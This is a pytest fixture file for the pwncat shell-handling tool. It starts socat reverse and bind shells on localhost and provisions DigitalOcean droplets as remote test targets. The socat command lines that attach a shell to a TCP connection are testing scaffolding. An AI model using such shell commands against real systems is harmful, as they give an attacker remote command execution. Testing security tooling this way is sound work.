#!/usr/bin/env python3
import dataclasses
import random
import socket
import string
import time
import os

import digitalocean
import pytest
from xprocess import ProcessStarter
from Crypto.PublicKey import RSA

# Test multiple shells
SHELLS = ["/bin/sh", "/bin/bash", "/usr/bin/dash", "/usr/bin/zsh"]


class LinuxReverseStarter(ProcessStarter):
    """ Start an infinite linux reverse shell using socat """

    name = "linux_reverse"
    pattern = "READY"
    args = [
        "/bin/sh",
        "-c",
        "echo READY; socat TCP4:127.0.0.1:{port},retry,forever,fork EXEC:{shell}",
    ]
    timeout = 5

    @classmethod
    def get_connection_details(cls):
        """ Custom method to provide connection details across all starters """

        return {
            "platform": "linux",
            "host": "127.0.0.1",
            "port": cls.port,
            "protocol": "bind",
        }

    def startup_check(self):

        details = self.get_connection_details()

        # with socket.create_server(
        #     (details["host"], details["port"]), reuse_port=True
        # ) as sock:
        #     client = sock.accept()

        return True


class LinuxBindStarter(ProcessStarter):
    """ Start an infinite linux bind shell using socat """

    name = "linux_bind"
    pattern = "READY"
    args = [
        "/bin/sh",
        "-c",
        "echo READY; socat TCP4-LISTEN:{port},bind=127.0.0.1,reuseaddr,fork EXEC:{shell}",
    ]
    timeout = 5

    @classmethod
    def get_connection_details(cls):
        """ Return connection details for this method """

        return {
            "platform": "linux",
            "host": "127.0.0.1",
            "port": cls.port,
            "protocol": "connect",
        }

    def startup_check(self):

        details = self.get_connection_details()

        with socket.create_connection((details["host"], details["port"])) as sock:
            pass

        return True


class LinuxFixtureParam(str):
    """This is a hack to get the names of parameterized fixtures
    to have meaning beyond "0", "1", "2", etc. Basically, we create
    a new sublass of string, and apply a constant value which we want
    to be the name of the parameterized fixture. We also assign members
    which contain the process starter and shell path for access by the
    fixture itself."""

    def __new__(cls, starter, shell):
        obj = str.__new__(cls, f"{starter.name}_{os.path.basename(shell)}")
        obj.__init__(starter, shell)
        return obj

    def __init__(self, starter, shell):
        self.starter = starter
        self.shell = shell


def LinuxEnumShells(starter):
    return [LinuxFixtureParam(starter, shell) for shell in SHELLS]


@pytest.fixture(
    params=[
        *LinuxEnumShells(LinuxReverseStarter),
        *LinuxEnumShells(LinuxBindStarter),
    ]
)
def linux(xprocess, request):
    """ Create linux connections available to the pwncat tests """

    class Starter(request.param.starter):
        shell = request.param.shell
        args = request.param.starter.args

    # We need to make a copy of the args array, and assign the port
    # outside of the class definition to ensure we don't modify the
    # class of other fixture parameters by mistake.
    Starter.args = request.param.starter.args[:].copy()
    Starter.port = random.randint(30000, 60000)
    Starter.args[-1] = Starter.args[-1].format(port=Starter.port, shell=Starter.shell)

    logfile = xprocess.ensure(str(request.param), Starter)

    yield Starter.get_connection_details()

    xprocess.getinfo(str(request.param)).terminate()


@pytest.fixture
def session(linux):

    import pwncat.manager

    with pwncat.manager.Manager(config=None) as manager:
        session = manager.create_session(**linux)
        yield session


@dataclasses.dataclass
class DigitalOceanFixture(object):
    """ Digital Ocean Fixture Data """

    ubuntu: digitalocean.Droplet
    """ Ubuntu 20.04 droplet instance """
    centos: digitalocean.Droplet
    """ CentOS 7 droplet instance """
    windows: digitalocean.Droplet
    """ Windows droplet instance """

    user: str
    """ Username for initial access """
    password: str
    """ Password for initial access """
    ssh_key: str
    """ SSH private key used for auth to Linux servers """
    bind_port: int
    """ Port where shells are bound on the given servers """


@pytest.fixture
def digital_ocean():
    """ Construct digital ocean targets for remote testing """

    manager = digitalocean.Manager()
    project = [p for p in manager.get_all_projects() if p.name == "pwncat"][0]
    unique_name = "test-" + "".join(
        random.choices(list(string.ascii_letters + string.digits), k=5)
    )

    key = RSA.generate(2048)
    pubkey = key.publickey()

    droplets = []
    keys = []

    try:

        # Create the key
        do_key = digitalocean.SSHKey(
            name=unique_name, public_key=pubkey.exportKey("OpenSSH").decode("utf-8")
        )
        do_key.create()
        keys.append(do_key)

        # Create ubuntu vm
        ubuntu = digitalocean.Droplet(
            name=unique_name + "-ubuntu",
            region="nyc1",
            image="ubuntu-20-04-x64",
            size_slug="s-1vcpu-1gb",
            ssh_keys=[do_key],
            backups=False,
        )
        ubuntu.create()
        droplets.append(ubuntu)

        # Create centos vm
        centos = digitalocean.Droplet(
            name=unique_name + "-ubuntu",
            region="nyc1",
            image="ubuntu-20-04-x64",
            size_slug="s-1vcpu-1gb",
            ssh_keys=[do_key],
            backups=False,
        )
        centos.create()
        droplets.append(centos)

        # Create windows vm
        windows = digitalocean.Droplet(
            name=unique_name + "-ubuntu",
            region="nyc1",
            image="ubuntu-20-04-x64",
            size_slug="s-1vcpu-1gb",
            ssh_keys=[do_key],
            backups=False,
        )
        windows.create()
        droplets.append(windows)

        # Add tag to droplets
        tag = digitalocean.Tag(name=unique_name)
        tag.create()
        tag.add_droplets([ubuntu.id, windows.id, centos.id])

        # Wait for droplets to be up
        waiting_droplets = droplets.copy()
        while waiting_droplets:
            for droplet in waiting_droplets:
                actions = droplet.get_actions()
                for action in droplet.get_actions():
                    action.load()
                    if action.status != "completed":
                        break
                else:
                    droplet.load()
                    waiting_droplets.remove(droplet)
                    break
                time.sleep(1)
            time.sleep(5)

        # Wait for SSH to be up on the droplets
        while True:
            for droplet in droplets:
                try:
                    with socket.create_connection((droplet.ip_address, 22)) as sock:
                        pass
                except socket.error:
                    break
            else:
                break
            time.sleep(5)

        yield DigitalOceanFixture(
            ubuntu=ubuntu,
            centos=centos,
            windows=windows,
            user="root",
            password="wrong",
            ssh_key=key,
            bind_port=0,
        )

    finally:

        for droplet in manager.get_all_droplets(tag_name=unique_name):
            droplet.destroy()

        for do_key in manager.get_all_sshkeys():
            if do_key.name == unique_name:
                do_key.destroy()
